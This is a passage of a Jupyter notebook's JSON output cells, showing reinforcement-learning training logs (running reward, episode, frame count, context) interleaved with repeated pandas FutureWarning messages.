    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 14\t Frame count: 6200\t Context: 2\n",
      "Running reward: 11.00\t Episode 15\t Frame count: 6300\t Context: 1\n",
      "Running reward: 11.00\t Episode 15\t Frame count: 6400\t Context: 2\n",
      "Running reward: 11.00\t Episode 16\t Frame count: 6500\t Context: 1\n",
      "Running reward: 11.00\t Episode 17\t Frame count: 6600\t Context: 1\n",
      "Running reward: 11.00\t Episode 17\t Frame count: 6700\t Context: 1\n",
      "Running reward: 11.00\t Episode 17\t Frame count: 6800\t Context: 2\n",
      "Running reward: 11.00\t Episode 17\t Frame count: 6900\t Context: 2\n",
      "Running reward: 11.00\t Episode 17\t Frame count: 7000\t Context: 2\n",
      "Running reward: 11.00\t Episode 18\t Frame count: 7100\t Context: 1\n",
      "Running reward: 11.00\t Episode 18\t Frame count: 7200\t Context: 1\n",
      "Running reward: 11.00\t Episode 18\t Frame count: 7300\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 18\t Frame count: 7400\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 18\t Frame count: 7500\t Context: 2\n",
      "Running reward: 11.00\t Episode 18\t Frame count: 7600\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 18\t Frame count: 7700\t Context: 2\n",
      "Running reward: 11.00\t Episode 18\t Frame count: 7800\t Context: 2\n",
      "Running reward: 11.00\t Episode 18\t Frame count: 7900\t Context: 2\n",
      "Running reward: 11.00\t Episode 18\t Frame count: 8000\t Context: 2\n",
      "Running reward: 11.00\t Episode 19\t Frame count: 8100\t Context: 1\n",
      "Running reward: 11.00\t Episode 19\t Frame count: 8200\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 20\t Frame count: 8300\t Context: 2\n",
      "Running reward: 11.00\t Episode 20\t Frame count: 8400\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 21\t Frame count: 8500\t Context: 1\n",
      "Running reward: 11.00\t Episode 21\t Frame count: 8600\t Context: 1\n",
      "Running reward: 11.00\t Episode 21\t Frame count: 8700\t Context: 1\n",
      "Running reward: 11.00\t Episode 21\t Frame count: 8800\t Context: 2\n",
      "Running reward: 11.00\t Episode 21\t Frame count: 8900\t Context: 2\n",
      "Running reward: 11.00\t Episode 21\t Frame count: 9000\t Context: 2\n",
      "Running reward: 11.00\t Episode 21\t Frame count: 9100\t Context: 2\n",
      "Running reward: 11.00\t Episode 21\t Frame count: 9200\t Context: 2\n",
      "Running reward: 11.00\t Episode 21\t Frame count: 9300\t Context: 2\n",
      "Running reward: 11.00\t Episode 21\t Frame count: 9400\t Context: 2\n",
      "Running reward: 11.00\t Episode 22\t Frame count: 9500\t Context: 1\n",
      "Running reward: 11.00\t Episode 22\t Frame count: 9600\t Context: 1\n",
      "Running reward: 11.00\t Episode 22\t Frame count: 9700\t Context: 2\n",
      "Running reward: 11.00\t Episode 23\t Frame count: 9800\t Context: 1\n",
      "Running reward: 11.00\t Episode 23\t Frame count: 9900\t Context: 1\n",
      "Running reward: 11.00\t Episode 23\t Frame count: 10000\t Context: 1\n",
      "Running reward: 11.00\t Episode 23\t Frame count: 10100\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 23\t Frame count: 10200\t Context: 2\n",
      "Running reward: 11.00\t Episode 23\t Frame count: 10300\t Context: 2\n",
      "Running reward: 11.00\t Episode 23\t Frame count: 10400\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 24\t Frame count: 10500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 25\t Frame count: 10600\t Context: 1\n",
      "Running reward: 11.00\t Episode 25\t Frame count: 10700\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 26\t Frame count: 10800\t Context: 1\n",
      "Running reward: 11.00\t Episode 26\t Frame count: 10900\t Context: 1\n",
      "Running reward: 11.00\t Episode 26\t Frame count: 11000\t Context: 1\n",
      "Running reward: 11.00\t Episode 26\t Frame count: 11100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 26\t Frame count: 11200\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 26\t Frame count: 11300\t Context: 1\n",
      "Running reward: 11.00\t Episode 26\t Frame count: 11400\t Context: 1\n",
      "Running reward: 11.00\t Episode 26\t Frame count: 11500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 26\t Frame count: 11600\t Context: 1\n",
      "Running reward: 11.00\t Episode 26\t Frame count: 11700\t Context: 1\n",
      "Running reward: 11.00\t Episode 26\t Frame count: 11800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 26\t Frame count: 11900\t Context: 1\n",
      "Running reward: 11.00\t Episode 26\t Frame count: 12000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 26\t Frame count: 12100\t Context: 1\n",
      "Running reward: 11.00\t Episode 26\t Frame count: 12200\t Context: 1\n",
      "Running reward: 11.00\t Episode 26\t Frame count: 12300\t Context: 1\n",
      "Running reward: 11.00\t Episode 27\t Frame count: 12400\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 27\t Frame count: 12500\t Context: 1\n",
      "Running reward: 11.00\t Episode 27\t Frame count: 12600\t Context: 2\n",
      "Running reward: 11.00\t Episode 27\t Frame count: 12700\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 28\t Frame count: 12800\t Context: 2\n",
      "Running reward: 11.00\t Episode 28\t Frame count: 12900\t Context: 2\n",
      "Running reward: 11.00\t Episode 28\t Frame count: 13000\t Context: 2\n",
      "Running reward: 11.00\t Episode 29\t Frame count: 13100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 29\t Frame count: 13200\t Context: 1\n",
      "Running reward: 11.00\t Episode 29\t Frame count: 13300\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 29\t Frame count: 13400\t Context: 2\n",
      "Running reward: 11.00\t Episode 30\t Frame count: 13500\t Context: 2\n",
      "Running reward: 11.00\t Episode 30\t Frame count: 13600\t Context: 2\n",
      "Running reward: 11.00\t Episode 31\t Frame count: 13700\t Context: 1\n",
      "Running reward: 11.00\t Episode 31\t Frame count: 13800\t Context: 2\n",
      "Running reward: 11.00\t Episode 31\t Frame count: 13900\t Context: 2\n",
      "Running reward: 11.00\t Episode 31\t Frame count: 14000\t Context: 2\n",
      "Running reward: 11.00\t Episode 31\t Frame count: 14100\t Context: 2\n",
      "Running reward: 11.00\t Episode 32\t Frame count: 14200\t Context: 1\n",
      "Running reward: 11.00\t Episode 32\t Frame count: 14300\t Context: 1\n",
      "Running reward: 11.00\t Episode 32\t Frame count: 14400\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 32\t Frame count: 14500\t Context: 2\n",
      "Running reward: 11.00\t Episode 32\t Frame count: 14600\t Context: 2\n",
      "Running reward: 11.00\t Episode 32\t Frame count: 14700\t Context: 2\n",
      "Running reward: 11.00\t Episode 32\t Frame count: 14800\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 32\t Frame count: 14900\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 32\t Frame count: 15000\t Context: 2\n",
      "Running reward: 11.00\t Episode 32\t Frame count: 15100\t Context: 2\n",
      "Running reward: 11.00\t Episode 32\t Frame count: 15200\t Context: 2\n",
      "Running reward: 11.00\t Episode 32\t Frame count: 15300\t Context: 2\n",
      "Running reward: 11.00\t Episode 32\t Frame count: 15400\t Context: 2\n",
      "Running reward: 11.00\t Episode 33\t Frame count: 15500\t Context: 2\n",
      "Running reward: 11.00\t Episode 34\t Frame count: 15600\t Context: 1\n",
      "Running reward: 11.00\t Episode 34\t Frame count: 15700\t Context: 1\n",
      "Running reward: 11.00\t Episode 34\t Frame count: 15800\t Context: 2\n",
      "Running reward: 11.00\t Episode 34\t Frame count: 15900\t Context: 2\n",
      "Running reward: 11.00\t Episode 35\t Frame count: 16000\t Context: 1\n",
      "Running reward: 11.00\t Episode 35\t Frame count: 16100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 35\t Frame count: 16200\t Context: 1\n",
      "Running reward: 11.00\t Episode 35\t Frame count: 16300\t Context: 1\n",
      "Running reward: 11.00\t Episode 35\t Frame count: 16400\t Context: 1\n",
      "Running reward: 11.00\t Episode 35\t Frame count: 16500\t Context: 1\n",
      "Running reward: 11.00\t Episode 35\t Frame count: 16600\t Context: 1\n",
      "Running reward: 11.00\t Episode 36\t Frame count: 16700\t Context: 1\n",
      "Running reward: 11.00\t Episode 36\t Frame count: 16800\t Context: 2\n",
      "Running reward: 11.00\t Episode 37\t Frame count: 16900\t Context: 1\n",
      "Running reward: 11.00\t Episode 37\t Frame count: 17000\t Context: 2\n",
      "Running reward: 11.00\t Episode 37\t Frame count: 17100\t Context: 2\n",
      "Running reward: 11.00\t Episode 38\t Frame count: 17200\t Context: 1\n",
      "Running reward: 11.00\t Episode 38\t Frame count: 17300\t Context: 1\n",
      "Running reward: 11.00\t Episode 38\t Frame count: 17400\t Context: 1\n",
      "Running reward: 11.00\t Episode 38\t Frame count: 17500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 39\t Frame count: 17600\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 39\t Frame count: 17700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 39\t Frame count: 17800\t Context: 1\n",
      "Running reward: 11.00\t Episode 39\t Frame count: 17900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 39\t Frame count: 18000\t Context: 1\n",
      "Running reward: 11.00\t Episode 39\t Frame count: 18100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 39\t Frame count: 18200\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 39\t Frame count: 18300\t Context: 2\n",
      "Running reward: 11.00\t Episode 39\t Frame count: 18400\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 39\t Frame count: 18500\t Context: 2\n",
      "Running reward: 11.00\t Episode 40\t Frame count: 18600\t Context: 1\n",
      "Running reward: 11.00\t Episode 40\t Frame count: 18700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 40\t Frame count: 18800\t Context: 1\n",
      "Running reward: 11.00\t Episode 40\t Frame count: 18900\t Context: 1\n",
      "Running reward: 11.00\t Episode 40\t Frame count: 19000\t Context: 1\n",
      "Running reward: 11.00\t Episode 40\t Frame count: 19100\t Context: 1\n",
      "Running reward: 11.00\t Episode 40\t Frame count: 19200\t Context: 2\n",
      "Running reward: 11.00\t Episode 41\t Frame count: 19300\t Context: 1\n",
      "Running reward: 11.00\t Episode 41\t Frame count: 19400\t Context: 1\n",
      "Running reward: 11.00\t Episode 41\t Frame count: 19500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 41\t Frame count: 19600\t Context: 1\n",
      "Running reward: 11.00\t Episode 41\t Frame count: 19700\t Context: 1\n",
      "Running reward: 11.00\t Episode 42\t Frame count: 19800\t Context: 1\n",
      "Running reward: 11.00\t Episode 43\t Frame count: 19900\t Context: 1\n",
      "Running reward: 11.00\t Episode 43\t Frame count: 20000\t Context: 2\n",
      "Running reward: 11.00\t Episode 43\t Frame count: 20100\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 43\t Frame count: 20200\t Context: 2\n",
      "Running reward: 11.00\t Episode 44\t Frame count: 20300\t Context: 1\n",
      "Running reward: 11.00\t Episode 44\t Frame count: 20400\t Context: 1\n",
      "Running reward: 11.00\t Episode 44\t Frame count: 20500\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 44\t Frame count: 20600\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 45\t Frame count: 20700\t Context: 1\n",
      "Running reward: 11.00\t Episode 45\t Frame count: 20800\t Context: 1\n",
      "Running reward: 11.00\t Episode 45\t Frame count: 20900\t Context: 2\n",
      "Running reward: 11.00\t Episode 45\t Frame count: 21000\t Context: 2\n",
      "Running reward: 11.00\t Episode 46\t Frame count: 21100\t Context: 1\n",
      "Running reward: 11.00\t Episode 46\t Frame count: 21200\t Context: 1\n",
      "Running reward: 11.00\t Episode 46\t Frame count: 21300\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 47\t Frame count: 21400\t Context: 1\n",
      "Running reward: 11.00\t Episode 47\t Frame count: 21500\t Context: 1\n",
      "Running reward: 11.00\t Episode 47\t Frame count: 21600\t Context: 1\n",
      "Running reward: 11.00\t Episode 47\t Frame count: 21700\t Context: 1\n",
      "Running reward: 11.00\t Episode 47\t Frame count: 21800\t Context: 1\n",
      "Running reward: 11.00\t Episode 47\t Frame count: 21900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 47\t Frame count: 22000\t Context: 1\n",
      "Running reward: 11.00\t Episode 47\t Frame count: 22100\t Context: 2\n",
      "Running reward: 11.00\t Episode 48\t Frame count: 22200\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 48\t Frame count: 22300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 48\t Frame count: 22400\t Context: 2\n",
      "Running reward: 11.00\t Episode 48\t Frame count: 22500\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 48\t Frame count: 22600\t Context: 2\n",
      "Running reward: 11.00\t Episode 49\t Frame count: 22700\t Context: 1\n",
      "Running reward: 11.00\t Episode 49\t Frame count: 22800\t Context: 1\n",
      "Running reward: 11.00\t Episode 49\t Frame count: 22900\t Context: 1\n",
      "Running reward: 11.00\t Episode 49\t Frame count: 23000\t Context: 1\n",
      "Running reward: 11.00\t Episode 49\t Frame count: 23100\t Context: 1\n",
      "Running reward: 11.00\t Episode 49\t Frame count: 23200\t Context: 2\n",
      "Running reward: 11.00\t Episode 49\t Frame count: 23300\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 50\t Frame count: 23400\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
